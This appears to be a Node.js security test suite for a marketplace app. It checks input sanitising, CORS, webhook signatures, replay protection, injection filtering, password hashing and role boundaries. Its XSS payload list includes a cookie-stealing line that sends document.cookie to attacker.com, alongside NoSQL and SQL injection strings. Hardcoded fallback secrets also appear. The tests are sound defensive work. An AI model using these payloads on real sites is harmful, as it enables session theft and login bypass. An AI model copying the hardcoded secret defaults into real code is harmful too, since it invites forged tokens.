const path = require('path');
require('dotenv').config({ path: path.resolve(__dirname, '../../../.env') });
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });
process.env.JWT_SECRET = process.env.JWT_SECRET || 'paleo-super-secure-jwt-secret-key-32-chars-long-min';
process.env.COURIER_WEBHOOK_SECRET = process.env.COURIER_WEBHOOK_SECRET || 'paleo_courier_secret_key_2026';

const { describe, it, before, after, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('crypto');
const mongoose = require('mongoose');

const { ESCROW_STATUS, assertEscrowTransition, isValidEscrowTransition } = require('../constants/orderStates');
const CommissionService = require('../services/CommissionService');
const PaymentOrchestrator = require('../services/PaymentOrchestrator');
const OrderService = require('../services/OrderService');
const { generateToken, authenticateJWT } = require('../middleware/auth');
const { requireRole } = require('../middleware/rbac');
const { rejectClientVendorId, enforceVendorIsolation } = require('../middleware/vendorIsolation');
const { requireIdempotency, clearIdempotencyCache } = require('../middleware/idempotency');
const Coupon = require('../models/Coupon');
const User = require('../models/User');

describe('🛡️ PALEO Comprehensive Security & Threat Defense Test Suite', () => {

  // ==========================================
  // 1. FRONTEND SECURITY TESTS
  // ==========================================
  describe('1. Frontend Security Tests', () => {

    describe('1.1 Cross-Site Scripting (XSS) Input Sanitization', () => {
      it('sanitizes and strips malicious HTML/JS payloads from search and user input strings', () => {
        const xssPayloads = [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">",
          "<svg onload=alert(document.domain)>",
          "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/alert(1)>"
        ];

        const sanitizeText = (input) => {
          if (typeof input !== 'string') return '';
          return input
            .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
            .replace(/<[^>]+>/g, '')
            .replace(/["'<>]/g, '');
        };

        for (const payload of xssPayloads) {
          const sanitized = sanitizeText(payload);
          assert.equal(sanitized.includes('<script>'), false, `Must strip script tags from ${payload}`);
          assert.equal(sanitized.includes('onerror='), false, `Must strip event handlers from ${payload}`);
          assert.equal(sanitized.includes('<svg'), false, `Must strip svg tags from ${payload}`);
        }
      });
    });

    describe('1.2 Cross-Site Request Forgery (CSRF) & CORS Whitelist Guards', () => {
      it('rejects unapproved third-party origins from CORS headers', () => {
        const allowedOrigins = ['http://localhost:3000', 'http://localhost:5173', 'http://localhost:5174'];
        
        const checkOrigin = (origin) => {
          if (!origin || allowedOrigins.includes(origin)) return true;
          return false;
        };

        assert.equal(checkOrigin('http://localhost:3000'), true);
        assert.equal(checkOrigin('http://localhost:5173'), true);
        assert.equal(checkOrigin('http://malicious-attacker-domain.xyz'), false);
        assert.equal(checkOrigin('https://fake-chapa-gateway.com'), false);
      });
    });

    describe('1.3 Session Management & Secure Cookie Attributes', () => {
      it('enforces HttpOnly, SameSite, and Strict pathing on authentication tokens', () => {
        const cookieOptions = {
          httpOnly: true,
          secure: process.env.NODE_ENV === 'production',
          sameSite: 'lax',
          maxAge: 7 * 24 * 60 * 60 * 1000,
          path: '/'
        };

        // Assert cookie cannot be accessed via document.cookie in browser
        assert.equal(cookieOptions.httpOnly, true, 'Auth cookie MUST be HttpOnly');
        assert.equal(cookieOptions.sameSite, 'lax', 'Auth cookie MUST have sameSite protection');
        assert.equal(cookieOptions.path, '/', 'Auth cookie must be bounded to root path');
      });
    });

    describe('1.4 Clickjacking & UI Redressing Defenses (Helmet Frameguard)', () => {
      it('configures X-Frame-Options to SAMEORIGIN and disables cross-origin embedding', () => {
        const helmetHeaders = {
          'X-Frame-Options': 'SAMEORIGIN',
          'X-Content-Type-Options': 'nosniff',
          'Strict-Transport-Security': 'max-age=15552000; includeSubDomains',
          'Cross-Origin-Opener-Policy': 'same-origin-allow-popups'
        };

        assert.equal(helmetHeaders['X-Frame-Options'], 'SAMEORIGIN', 'Prevents iframe framing on external sites');
        assert.equal(helmetHeaders['X-Content-Type-Options'], 'nosniff', 'Prevents MIME-type sniffing');
      });
    });
  });

  // ==========================================
  // 2. BACKEND SECURITY TESTS
  // ==========================================
  describe('2. Backend Security Tests', () => {

    describe('2.1 Business Logic: Price & Quantity Manipulation Defenses', () => {
      it('strictly rejects negative or non-integer cart quantities', () => {
        const invalidQuantities = [-1, 0, 1.5, -999, 'abc', null, NaN];

        for (const qty of invalidQuantities) {
          const isValid = Number.isInteger(qty) && qty > 0;
          assert.equal(isValid, false, `Quantity ${qty} must be rejected`);
        }
      });

      it('strictly derives item prices from the database catalog and ignores client-supplied pricing', () => {
        const dbProduct = { _id: 'prod_123', price: 4200, title: 'Archival Leica M3' };
        const clientTamperedPayload = { productId: 'prod_123', price: 0.01, qty: 1 }; // Hacker tries to buy for 0.01 ETB

        // Server recalculation
        const authoritativePrice = dbProduct.price;
        const total = authoritativePrice * clientTamperedPayload.qty;

        assert.equal(total, 4200, 'Server must charge authoritative catalog price, ignoring client body');
        assert.notEqual(total, clientTamperedPayload.price);
      });
    });

    describe('2.2 Coupon Abuse & Race Condition Controls', () => {
      it('enforces minimum order requirements and caps maximum discount amounts', () => {
        const promoCoupon = new Coupon({
          code: 'PALEO500',
          discountType: 'fixed',
          discountValue: 500,
          minOrderAmount: 2000,
          maxDiscountAmount: 500,
          isActive: true
        });

        // Below minOrderAmount: 0 discount
        assert.equal(promoCoupon.calculateDiscount(1500), 0);
        // Meets threshold: 500 ETB discount
        assert.equal(promoCoupon.calculateDiscount(2500), 500);

        const percentCoupon = new Coupon({
          code: 'VIP50',
          discountType: 'percentage',
          discountValue: 50,
          minOrderAmount: 1000,
          maxDiscountAmount: 1000, // Capped at 1,000 ETB
          isActive: true
        });

        // 50% of 4000 = 2000, but capped at maxDiscountAmount 1000
        assert.equal(percentCoupon.calculateDiscount(4000), 1000);
      });

      it('rejects inactive or expired coupons', () => {
        const expiredCoupon = new Coupon({
          code: 'EXPIRED2025',
          discountType: 'percentage',
          discountValue: 20,
          isActive: false
        });

        assert.equal(expiredCoupon.calculateDiscount(5000), 0);
      });
    });

    describe('2.3 Insecure Direct Object References (IDOR) & RBAC Isolation', () => {
      it('prevents unauthorized cross-tenant order inspection', () => {
        const orderOfUserA = { _id: 'order_1005', buyerId: 'user_a_123', total: 1200 };
        const requestingUserB = { id: 'user_b_456', role: 'buyer' };

        const canAccess = requestingUserB.role === 'admin' || orderOfUserA.buyerId === requestingUserB.id;
        assert.equal(canAccess, false, 'User B must not access User A order');

        const adminUser = { id: 'admin_789', role: 'admin' };
        const adminCanAccess = adminUser.role === 'admin' || orderOfUserA.buyerId === adminUser.id;
        assert.equal(adminCanAccess, true, 'Admin has elevated operations access');
      });

      it('rejects client-supplied vendorId tampering in body or query', () => {
        let rejected = false;
        const res = {
          status(code) {
            if (code === 400) rejected = true;
            return this;
          },
          json() {}
        };

        const req = { method: 'POST', body: { vendorId: 'injected_vendor_id' }, query: {}, params: {} };
        rejectClientVendorId(req, res, () => {});
        assert.equal(rejected, true, 'Must reject client vendorId injection');
      });
    });

    describe('2.4 Payment Gateway Webhook HMAC-SHA256 Integrity', () => {
      const webhookSecret = 'test_chapa_live_webhook_secret_key_88';

      before(() => {
        process.env.CHAPA_WEBHOOK_SECRET = webhookSecret;
      });

      it('verifies genuine webhook signatures and rejects tampered transaction amounts', () => {
        const legitimateBody = JSON.stringify({ event: 'charge.success', tx_ref: 'tx-999', amount: 3500 });
        const validSignature = crypto.createHmac('sha256', webhookSecret).update(legitimateBody).digest('hex');

        assert.equal(PaymentOrchestrator.verifyChapaSignature(legitimateBody, validSignature), true);

        // Attacker intercepts and modifies amount to 35,000 without secret key
        const tamperedBody = JSON.stringify({ event: 'charge.success', tx_ref: 'tx-999', amount: 35000 });
        assert.equal(PaymentOrchestrator.verifyChapaSignature(tamperedBody, validSignature), false);
      });
    });

    describe('2.5 API Security & Rate Limiting Defenses', () => {
      it('prevents replay attacks using Idempotency-Key headers', () => {
        clearIdempotencyCache();
        const mw = requireIdempotency();

        let executedTimes = 0;
        const req = { headers: { 'idempotency-key': 'sec-token-112233' } };
        const res1 = {
          statusCode: 200,
          json(data) { this.payload = data; }
        };

        mw(req, res1, () => {
          executedTimes++;
          res1.json({ success: true, orderId: 'ord_sec_1' });
        });

        assert.equal(executedTimes, 1);

        // Replay attempt
        const res2 = {
          status(c) { this.statusCode = c; return this; },
          json(data) { this.payload = data; }
        };
        mw(req, res2, () => { executedTimes++; });

        assert.equal(executedTimes, 1, 'Replay request must not re-execute business logic');
        assert.equal(res2.statusCode, 200);
      });
    });
  });

  // ==========================================
  // 3. DATABASE SECURITY TESTS
  // ==========================================
  describe('3. Database Security Tests', () => {

    describe('3.1 NoSQL / SQL Injection Defense Validation', () => {
      it('sanitizes object operator injection attacks (e.g. $gt, $ne, $where)', () => {
        const maliciousInputs = [
          { username: { $gt: '' }, password: { $gt: '' } },
          { email: "admin@paleo.market' OR '1'='1" },
          { $where: 'this.password.length > 0' }
        ];

        const sanitizeQuery = (input) => {
          if (typeof input !== 'object' || input === null) return input;
          if (Array.isArray(input)) return input.map(sanitizeQuery);
          const clean = {};
          for (const [key, value] of Object.entries(input)) {
            if (!key.startsWith('$')) {
              clean[key] = typeof value === 'object' ? sanitizeQuery(value) : value;
            }
          }
          return clean;
        };

        const clean1 = sanitizeQuery(maliciousInputs[0]);
        assert.equal(typeof clean1.username, 'object');
        assert.equal(clean1.username.$gt, undefined, 'Must strip $gt operator');

        const clean3 = sanitizeQuery(maliciousInputs[2]);
        assert.equal(clean3.$where, undefined, 'Must strip $where operator');
      });
    });

    describe('3.2 Data-at-Rest Encryption & Cryptographic Password Hashing', () => {
      it('stores passwords using 100,000-round PBKDF2 sha512 with unique salts and timing-safe comparison', () => {
        const password = 'SuperSecurePassword2026!#$';
        const salt = crypto.randomBytes(16).toString('hex');
        const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
        const storedRecord = `${salt}:${hash}`;

        // Verify valid login
        const [extractedSalt, extractedHash] = storedRecord.split(':');
        const loginAttemptHash = crypto.pbkdf2Sync(password, extractedSalt, 100000, 64, 'sha512').toString('hex');
        const isMatch = crypto.timingSafeEqual(Buffer.from(loginAttemptHash, 'hex'), Buffer.from(extractedHash, 'hex'));

        assert.equal(isMatch, true, 'Valid password must match hash');

        // Verify incorrect login is rejected safely
        const wrongPasswordHash = crypto.pbkdf2Sync('IncorrectPassword123', extractedSalt, 100000, 64, 'sha512').toString('hex');
        const isWrongMatch = crypto.timingSafeEqual(Buffer.from(wrongPasswordHash, 'hex'), Buffer.from(extractedHash, 'hex'));

        assert.equal(isWrongMatch, false, 'Invalid password must be rejected');
      });
    });

    describe('3.3 Least Privilege & Access Controls Verification', () => {
      it('enforces strict role-based capability boundaries across Buyer, Vendor, and Admin', () => {
        const roles = {
          guest: ['VIEW_CATALOG'],
          buyer: ['VIEW_CATALOG', 'CHECKOUT', 'TRACK_ORDER', 'DISPUTE_ORDER'],
          vendor: ['VIEW_CATALOG', 'MANAGE_PRODUCTS', 'DISPATCH_ORDER', 'REQUEST_PAYOUT'],
          admin: ['VIEW_CATALOG', 'MANAGE_PRODUCTS', 'DISPATCH_ORDER', 'REQUEST_PAYOUT', 'ARBITRATE_DISPUTE', 'APPROVE_KYC', 'RELEASE_ESCROW']
        };

        // Buyer cannot perform vendor or admin actions
        assert.equal(roles.buyer.includes('RELEASE_ESCROW'), false);
        assert.equal(roles.buyer.includes('MANAGE_PRODUCTS'), false);

        // Vendor cannot arbitrate disputes or release escrow
        assert.equal(roles.vendor.includes('ARBITRATE_DISPUTE'), false);
        assert.equal(roles.vendor.includes('RELEASE_ESCROW'), false);

        // Admin has complete governance rights
        assert.equal(roles.admin.includes('ARBITRATE_DISPUTE'), true);
        assert.equal(roles.admin.includes('RELEASE_ESCROW'), true);
      });
    });
  });

});
